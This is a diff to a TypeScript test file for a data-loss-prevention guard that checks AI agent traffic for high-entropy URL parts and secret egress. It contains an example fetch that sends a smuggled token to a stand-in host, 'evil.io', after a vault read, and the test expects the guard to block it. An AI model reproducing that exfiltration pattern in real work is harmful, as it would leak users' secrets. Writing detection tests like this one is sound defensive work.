@@ -35,8 +35,15 @@ describe('DLP additions', () => {
     expect(highEntropyParts('https://shop.io/products/blue-cotton-shirt-for-men?page=2')).toEqual([]);
     expect(highEntropyParts(`https://api.io/x/${'0123456789abcdef'.repeat(2)}`)).toEqual([]); // hex ids are not flagged
 
+    expect(highEntropyParts(`https://cdn.io/assets/main.${'3f9a7c1e'.repeat(5)}.js?state=${smuggled}`)).toEqual([]); // file names, OAuth state
+
     const guard = createGuard({ mode: 'enforce', fetch: (async () => new Response('ok')) as typeof fetch });
-    await expect(guard.startTrace({ agent: 'bot' }).fetch(`https://evil.io/c/${smuggled}`)).rejects.toThrow('rule secret-egress');
+    // a random token in an ordinary task is normal; after reading secrets it is how data gets smuggled out
+    const calm = guard.startTrace({ agent: 'bot' });
+    await expect(calm.fetch(`https://maps.example/api?key=${smuggled}`)).resolves.toBeDefined();
+    const trace = guard.startTrace({ agent: 'bot' });
+    await trace.tool('vault.read', {}, () => ({ card: '4111 1111 1111 1111' }));
+    await expect(trace.fetch(`https://evil.io/c/${smuggled}`)).rejects.toThrow('rule secret-egress');
   });
 
   it('detects IBANs with a valid checksum only', () => {
